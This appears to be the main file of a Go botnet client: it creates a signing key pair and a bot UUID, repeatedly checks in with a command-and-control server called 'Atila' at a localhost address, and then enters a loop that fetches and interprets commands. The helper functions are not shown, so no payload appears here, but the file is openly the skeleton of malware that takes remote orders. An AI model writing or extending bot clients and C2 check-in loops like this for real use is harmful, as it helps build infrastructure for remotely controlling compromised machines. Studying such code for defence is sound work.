package main

import (
	"time"

	"github.com/google/uuid"
)

// Key-pair used for signing and verifying messages.
var privateIdentificationKey = generatePrivateKey()
var publicIdentificationKey = &privateIdentificationKey.PublicKey

// Generate the unique bot identifier.
var id uuid.UUID = uuid.New()

// Atila is a back-end command & control server.
var atilaHost string = "http://localhost:60666"

func main() {
	// Make yourself known to the Atila. (cnc)
	for range time.Tick(time.Second * 5) {
		identified := identify(id.String(), publicIdentificationKey)
		if identified {
			break
		}
	}

	// Fetch and interpret messages, then issue responses.
	inboxReader()
}
